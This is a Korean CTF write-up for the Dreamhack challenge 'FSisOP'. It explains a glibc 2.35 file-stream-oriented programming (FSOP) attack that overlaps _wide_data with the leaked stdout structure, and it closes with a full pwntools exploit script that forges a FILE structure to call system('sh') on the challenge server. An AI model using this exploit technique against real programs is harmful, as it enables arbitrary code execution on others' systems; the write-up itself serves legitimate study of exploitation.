---
title: "[DREAMHACK] FSisOP writeup"
date: 2026-02-19 07:50:00
categories: Essay
tags: [writeup]
---

### 환경 설정
컨테이너 하나 만드셔서 `libc.so.6`, `ld-linux-x86-64.so.2`  
위 두 친구 빼오고.. `patchelf`로 두 파일을 `./prob`에 넣어줄게요..
```bash
patchelf --replace-needed libc.so.6 ./libc.so.6 ./prob
patchelf --set-interpreter ld-linux-x86-64.so.2 ./prob
```
문제에서 준 이미지로는 뭘 하고 싶지 않아서.. 이미 있던 `22.04` 컨테이너를 썼어요..

# 정적 분석 
파일 정보를 잠깐 볼게요..
```bash
./prob: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV) ... not stripped
```
딱히 여기서 결과를 전부 보여드릴 필요 없다고 생각해서..  
심볼이 살아 있으니까.. 
```bash
...
                 U __libc_start_main@GLIBC_2.34
                 U _exit@GLIBC_2.2.5
                 U printf@GLIBC_2.2.5
                 U puts@GLIBC_2.2.5
                 U read@GLIBC_2.2.5
                 U setvbuf@GLIBC_2.2.5
...
00000000000011c9 T main
0000000000001240 T _fini
0000000000002000 R _IO_stdin_used
...
0000000000003da0 d __do_global_dtors_aux_fini_array_entry
0000000000003da8 d _DYNAMIC
0000000000003f98 d _GLOBAL_OFFSET_TABLE_
...
0000000000004010 B __bss_start
0000000000004010 D _edata
0000000000004010 B stdout@GLIBC_2.2.5
0000000000004018 b completed.0
0000000000004020 B _end
```
그냥 감으로 중간 생략을 여러 번 했어요.. 특별한 느낌은 없네요..  
```js
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

보호기법도 정상적이네요...  
이제 코드를 볼게요..
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/4d2acbdb340720c5caa4299a3ac67130b48473ef804a26194bbc533d1a9bf4a8.png)

문제 제목이 `FSisOP`니까.. `puts()`, `exit()` 써서 마지막에 흐름을 조작할 수 있을 것 같다는 느낌이 드네요..  
`_bss_start`가 `stdin`의 위치와 동일하니까..  
`stdin`을 바꾸면 될 것 같네요.. 그런데 우분투 버전이 `22.04`라..  
아마 `glibc 2.35+` 거든요.. 여기서는 `vtable`이 인가된 영역..  
허용된 위치에 있는가..를 기준으로 판단해서 원하는 `fake_vtable`을..쓸 수 없습니다..  
이와 관련된 얘기는 `FSOP 공부` 카테고리에서 좀 더 적어놓을 예정이에요...

# 동적 분석
그냥.. 실행시키면
```c
0x758090c1a780
aaa
munmap_chunk(): invalid pointer
Aborted (core dumped)
```
`stdin`이 가리키는 주소.. 그리고 할당하다 터진 게 보이네요.. **정적 분석**에서 얘기드렸듯이..  
`vtable`은 조작할 수 없습니다.. 근데 `_wide_vtable`은 조작이 가능해요..  

생각해보니 대부분 다 `FSOP` 하실 줄 아실텐데 괜히 설명한 것 같네요..  
제가 느끼는 문제의 중요한 부분은.. `FSOP`에서의 `Overlapping`인 것 같습니다..  
~~(영어를 쓰면 설명의 멋이 증가한다는 얘기가 있어요..)~~  

`_IO_cleanup` 친구를 쓰는 경우에는 페이로드가..
```py
fp.flags = b'\x01'*4 + b';sh'
fp._IO_write_ptr = 0x10
fp.markers = libc.sym["system"]
fp._lock = stderr + 0x100 # r/w addr
fp._wide_data = stderr # overlapping
fp.unknown2 = 0xffffffff # this must be _mode
fp.vtable = libc.sym["_IO_wfile_jumps"]
```
이런 식으로 나오는데요..  
보통 이런 식으로 간단하게 짠다 하더라도.. `0xe8`의 크기가 나오기 마련이에요...  
결론을 말하자면 그냥 주소 빼서 잘 쓰면 된다..입니다..  
사실 gdb로 돌려볼 필요도 없이, 그냥 재활용만 잘 하면 되는 거라..

# 익스
```python
from pwn import *

'''
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("%p\n", _bss_start);
  read(0, _bss_start, 0xE0uLL);
  puts("modify finished!");
  _exit(0);
}
'''

context.binary = elf = ELF('./prob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 8296".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

# gdb.attach(p, '''
# b *main+108
# ''')
# pause()

lb = int(rl().strip(), 16) - libc.sym["_IO_2_1_stdout_"] # 0x21a780
stdout = lb + libc.sym["_IO_2_1_stdout_"]
slog("libc_base",  lb)
slog("stdout", stdout)

system = lb + libc.sym["system"]
io_wfile_jumps = lb + libc.sym["_IO_wfile_jumps"]
lock = lb + 0x21ba70
slog("system", system)
slog("_IO_wfile_jumps", io_wfile_jumps)
slog ("_lock", lock)

'''
vtable(오프셋 0xd8): 0x00007c4aed416600
_wide_data(오프셋 0xa0): 0x00007c4aed4199a0
_lock(오프셋 0x88): 0x00007c4aed41ba70
'''
wide_data = stdout - 0x10
fake_wide_vtable = stdout + 0x40

'''
struct _IO_FILE {
    int _flags;              // offset 0x00
    char *_IO_read_ptr;      // offset 0x08
    char *_IO_read_end;      // offset 0x10
    char *_IO_read_base;     // offset 0x18
    char *_IO_write_base;    // offset 0x20
    char *_IO_write_ptr;     // offset 0x28
    char *_IO_write_end;     // offset 0x30
    char *_IO_buf_base;      // offset 0x38
    char *_IO_buf_end;       // offset 0x40
    // ... 
    _IO_lock_t *_lock;       // offset 0x88
    // ... 
    struct _IO_wide_data *_wide_data;  // offset 0xa0 ★
    // ...
};
'''

pay = b''
pay += b'  sh\x00\x00\x00\x00'
pay += p64(0) * 3   
pay += p64(0) # write_base = 0
pay += p64(1) # write_ptr > 0
pay += p64(0) # write_end
pay += p64(0) # buf_base = 0
pay += p64(0) * 8 # 0x40 - 0x78
pay += p64(0) # old_offset
pay += p64(lock) # _lock
pay += p64(0) * 2 # 0x90 - 0x98
pay += p64(wide_data) # # wide_data
pay += p64(system) # doallocate
pay += p64(0) * 4 # 0xb0-0xc8
pay += p64(fake_wide_vtable) # wide_table, with no validations
pay += p64(io_wfile_jumps)

assert len(pay) == 0xe0
slog("pay_len", len(pay))

p.send(pay)
p.interactive()
```

+)
이때는 몰랐는데 `pwntools`의 `FileStructure()`가 있더라고요..
필요한 것만 설정해 줄 수 있으니 이 쪽이 더 편할 것 같습니다..